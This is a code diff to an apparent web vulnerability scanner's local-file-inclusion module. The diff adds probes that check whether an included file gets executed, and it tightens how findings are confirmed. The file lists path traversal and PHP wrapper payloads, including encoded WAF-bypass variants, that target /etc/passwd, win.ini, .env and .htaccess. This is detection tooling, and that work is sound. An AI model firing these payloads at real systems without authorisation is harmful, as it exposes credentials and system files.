@@ -17,6 +17,8 @@ type Module struct {
 	modkit.BaseActiveModule
 	rules []*rule
 	rhm   dedup.Lazy[dedup.RequestHashManager]
+	// operands draws the per-request operands of the execution probes.
+	operands operandSource
 }
 
 func New() *Module {
@@ -32,12 +34,23 @@ func New() *Module {
 			modkit.ScanScopeInsertionPoint,
 			modkit.AllParamTypes,
 		),
-		rules: getRules(),
-		rhm:   dedup.LazyDefaultRHM("lfi_generic"),
+		rules:    getRules(),
+		rhm:      dedup.LazyDefaultRHM("lfi_generic"),
+		operands: randomOperands,
 	}
 	m.ModuleTags = ModuleTags
 	return m
 }
+
+// ConfirmsByBodyDifferential opts this module into the executor's body-
+// differential safety net: a candidate finding is re-confirmed by replaying the
+// traversal request and requiring the included file content to reappear as
+// stable content absent from the clean baseline.
+func (m *Module) ConfirmsByBodyDifferential() bool { return true }
+
+// VulnClass enables cross-module (param, class) dedup: once any lfi module
+// reports a parameter, the others in the class skip it.
+func (m *Module) VulnClass() string { return modkit.VulnClassLFI }
 
 // ScanPerInsertionPoint tests a single insertion point for LFI.
 func (m *Module) ScanPerInsertionPoint(
@@ -75,18 +88,15 @@ func (m *Module) ScanPerInsertionPoint(
 	var results []*output.ResultEvent
 
 	for _, rule := range m.rules {
-		for _, payload := range rule.Payloads() {
-			// Build fuzzed request with payload
-			fuzzedRaw := ip.BuildRequest([]byte(payload))
+		for _, rp := range rule.Payloads() {
+			payload := rp.value
+			// Build fuzzed request with payload; pre-encoded payloads keep their
+			// own percent-encoding.
+			fuzzedRaw := httpmsg.BuildPayload(ip, []byte(payload), rp.preEncoded)
 
-			// Parse the fuzzed raw request to HttpRequestResponse
-			fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
-			if err != nil {
-				continue
-			}
-
-			// Copy HttpService from original request
-			fuzzedReq = fuzzedReq.WithService(ctx.Service())
+			// BuildRequest produces well-formed raw, so wrap directly instead
+			// of re-parsing on this hot path.
+			fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())
 
 			resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
 			if err != nil {
@@ -96,23 +106,123 @@ func (m *Module) ScanPerInsertionPoint(
 				continue
 			}
 
-			if rule.MatchWithBaseline(resp.Body().String(), origBody) {
-				results = append(results, &output.ResultEvent{
+			// A successful include returns the file content with a 2xx/3xx
+			// status. A 4xx/5xx is the server rejecting the path (the payload
+			// became a non-existent route) — its error/404 body must never be
+			// mistaken for leaked file content, even if that body happens to
+			// carry matching tokens or base64 (e.g. CDN 404 pages with data-URI
+			// images).
+			if r := resp.Response(); r != nil && r.StatusCode >= 400 {
+				resp.Close()
+				continue
+			}
+
+			if rule.MatchWithBaseline(resp.Body().String(), origBody, payload) {
+				ev := &output.ResultEvent{
 					URL:              urlx.String(),
 					Request:          string(fuzzedRaw),
 					Response:         resp.FullResponseString(),
 					FuzzingParameter: ip.Name(),
 					ExtractedResults: []string{payload},
-				})
+				}
+				// A published file reached through a URL path segment was fetched at
+				// its own URL, not included: report the exposure informationally, and
+				// anchor it at the file's URL since that is the thing to act on.
+				if modkit.DocrootFetchNotInclusion(ip.Type(), payload) {
+					if fileURL := httpmsg.GetURLFromRequest(urlx.Scheme, fuzzedRaw); fileURL != "" {
+						ev.URL = fileURL
+						ev.Matched = fileURL
+					}
+					ev.Info = modkit.DocrootFetchInfo(payload)
+					resp.Close()
+					return append(results, ev), nil
+				}
 				resp.Close()
-				return results, nil // Found LFI, skip remaining payloads for this IP
+				// A confirmed read proves an include-shaped sink; the execution
+				// probes decide whether it also runs code, which outranks the read.
+				if exec, _ := m.probeExecution(ctx, ip, httpClient, urlx.String(), origBody); exec != nil {
+					return append(results, exec), nil
+				}
+				return append(results, ev), nil // Found LFI, skip remaining payloads for this IP
 			}
 
 			resp.Close()
 		}
 	}
 
+	// No file read confirmed: the execution probes still run, since an include
+	// that evaluates wrappers can sit behind a path the read payloads miss.
+	exec, read := m.probeExecution(ctx, ip, httpClient, urlx.String(), origBody)
+	if exec != nil {
+		return append(results, exec), nil
+	}
+	if read != nil {
+		return append(results, read), nil
+	}
 	return results, nil
+}
+
+// probeExecution sends the execution probes in order and returns the first
+// confirmed execution as a finding. read is a data:// probe that came back as
+// text (a wrapper read, reported as the module's file-read finding) when no
+// probe executed. An unresponsive host ends the probes early.
+func (m *Module) probeExecution(
+	ctx *httpmsg.HttpRequestResponse,
+	ip httpmsg.InsertionPoint,
+	httpClient *http.Requester,
+	targetURL, origBody string,
+) (exec, read *output.ResultEvent) {
+	origReqBody := ""
+	if ctx.Request() != nil {
+		origReqBody = string(ctx.Request().Body())
+	}
+	probeBody := httpmsg.NewHttpRequest(httpmsg.BuildPayload(ip, []byte("php://input"), false)).Body()
+	// php://input reads the request body, so it is only sent when the
+	// insertion point is not itself in the body.
+	withInput := string(probeBody) == origReqBody
+
+	for _, p := range newExecProbes(m.operands, withInput) {
+		fuzzedRaw := httpmsg.BuildPayload(ip, []byte(p.payload), false)
+		if p.body != nil {
+			fuzzedRaw = httpmsg.NewHttpRequest(fuzzedRaw).WithBody(p.body).Raw()
+		}
+		resp, _, err := httpClient.Execute(httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service()), http.Options{})
+		if err != nil {
+			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
+				return nil, read
+			}
+			continue
+		}
+		if r := resp.Response(); r != nil && r.StatusCode >= 400 {
+			resp.Close()
+			continue
+		}
+		body := resp.Body().String()
+		request := string(fuzzedRaw)
+		executed := confirmExecution(body, origBody, request, p.product)
+		if !executed && (read != nil || !confirmWrapperText(body, origBody, request, p)) {
+			resp.Close()
+			continue
+		}
+		// Only a match pays for the full response copy.
+		ev := &output.ResultEvent{
+			URL:              targetURL,
+			Request:          request,
+			Response:         resp.FullResponseString(),
+			FuzzingParameter: ip.Name(),
+			ExtractedResults: []string{p.payload},
+		}
+		resp.Close()
+		if !executed {
+			read = ev
+			continue
+		}
+		ev.ExtractedResults = append(ev.ExtractedResults, p.product)
+		ev.Info = execFindingInfo(p)
+		ev.VulnClass = execVulnClass
+		return ev, nil
+	}
+	return nil, read
 }
 
 // https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/vulnerabilities/lfi/lfi-keyed.yaml
@@ -123,20 +233,28 @@ func getRules() []*rule {
 			"../../etc/passwd",
 			"../../../etc/passwd",
 			"../../../../etc/passwd",
-			"/etc/passwd%00.jpg",
 			"../../../../../../../../../../../../../../../etc/passwd",
-			"../../../../../../../../../../../../../../../etc/passwd%00.jpg",
-			`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
-			"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
-			"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd",
-			"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd",
 			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../etc/passwd",
 			"./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../etc/passwd",
 		},
 		[]*regexp.Regexp{
-			regexp.MustCompile(`root:.*:0:0:`),
+			// Require the full /etc/passwd line shape, not just `root:…:0:0:`.
+			// A real root entry is `root:x:0:0:root:/root:/bin/bash` — uid 0,
+			// gid 0, then a GECOS field, a home directory, and the start of a
+			// shell path. The bounded `[^:\r\n]` runs keep the match on a single
+			// passwd-shaped line and stop the former greedy `.*` from bridging
+			// unrelated `root:` / `:0:0:` tokens that happen to share a line in
+			// reflected JSON or HTML.
+			regexp.MustCompile(`root:[^:\r\n]{0,64}:0:0:[^:\r\n]{0,64}:[^:\r\n]{0,128}:[^\s:]`),
 		},
 		[]string{},
+	).withPreEncoded(
+		"/etc/passwd%00.jpg",
+		"../../../../../../../../../../../../../../../etc/passwd%00.jpg",
+		`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
+		"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
+		"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd",
+		"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd",
 	)
 	rules = append(rules, linuxRule)
 	/* -------------------------------------------------------------------------- */
@@ -146,24 +264,29 @@ func getRules() []*rule {
 			"../../../windows/win.ini",
 			"../../../../windows/win.ini",
 			"../../../../../../../../../../../../../../../windows/win.ini",
-			"c:/windows/win.ini%00.jpg",
-			"../../../../../../../../../../../../../../../windows/win.ini%00.jpg",
-			// double url encode
-			`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini`,
-			// hex_unicode
-			"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fwindows%u002fwin.ini",
-			// utf8_unicode
-			"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFwindows%C0%AFwin.ini",
-			// utf8_unicode_x
-			"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFwindows%C0AFwin.ini",
 			// bypass_replace
 			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../windows/win.ini",
 			`..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini`,
 			// bypass_waf_regx
 			"./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../windows/win.ini",
 		},
+		// Confirmed by requiring two distinct bracketed win.ini section headers
+		// (`[fonts]`, `[extensions]`, …) at line start — see confirmWinIni.
+		// The former bare words "fonts"/"extensions" are ordinary English and
+		// fired on any page that happened to contain them.
 		[]*regexp.Regexp{},
-		[]string{"bit app support", "fonts", "extensions"},
+		[]string{},
+	).withConfirm(confirmWinIni).withPreEncoded(
+		"c:/windows/win.ini%00.jpg",
+		"../../../../../../../../../../../../../../../windows/win.ini%00.jpg",
+		// double url encode
+		`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini`,
+		// hex_unicode
+		"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fwindows%u002fwin.ini",
+		// utf8_unicode
+		"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFwindows%C0%AFwin.ini",
+		// utf8_unicode_x
+		"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFwindows%C0AFwin.ini",
 	)
 	rules = append(rules, windowsRule)
 	/* ------------------------------------------------------------------------- */
@@ -188,22 +311,28 @@ func getRules() []*rule {
 			"php://filter/convert.base64-encode/resource=index.php",
 			"php://filter/convert.base64-encode/resource=../index.php",
 			"php://filter/convert.base64-encode/resource=../../index.php",
-			"data://text/plain;base64,PD9waHAgZWNobyAidmlnZW5pdW0tdGVzdCI7ID8+",
-			"expect://id",
-			"php://input",
 		},
-		[]*regexp.Regexp{
-			regexp.MustCompile(`^[A-Za-z0-9+/=]{50,}`),
-		},
-		[]string{"vigolium-test"},
-	)
+		// The convert.base64-encode reads are confirmed by decoding the returned
+		// blob and requiring real PHP source (see confirmPHPFilterBase64), not by
+		// a bare base64 charset regex — that fired on incidental base64 (data-URI
+		// images) in ordinary CDN/static 404 pages. The data://, expect:// and
+		// php://input wrappers are execution probes (exec_probe.go), sent with
+		// per-request operands rather than as fixed payloads.
+		[]*regexp.Regexp{},
+		[]string{},
+	).withConfirm(confirmPHPFilterBase64)
 	rules = append(rules, phpWrapperRule)
 	/* ------------------------------------------------------------------------- */
+	// Confirmed by requiring two distinct, file-shaped lines — sensitive
+	// `KEY=VALUE` assignments for .env, recognised Apache directives for
+	// .htaccess — see confirmAppConfig. The former bare-word AND of
+	// DB_PASSWORD/APP_KEY/APP_SECRET both missed real Laravel/Symfony files
+	// (which rarely carry all three) and could fire on prose mentioning them.
 	appConfigRule := newRule(
 		[]string{".env", "../.env", "../../.env", ".htaccess", "../.htaccess"},
 		[]*regexp.Regexp{},
-		[]string{"DB_PASSWORD", "APP_KEY", "APP_SECRET"},
-	)
+		[]string{},
+	).withConfirm(confirmAppConfig)
 	rules = append(rules, appConfigRule)
 	return rules
 }
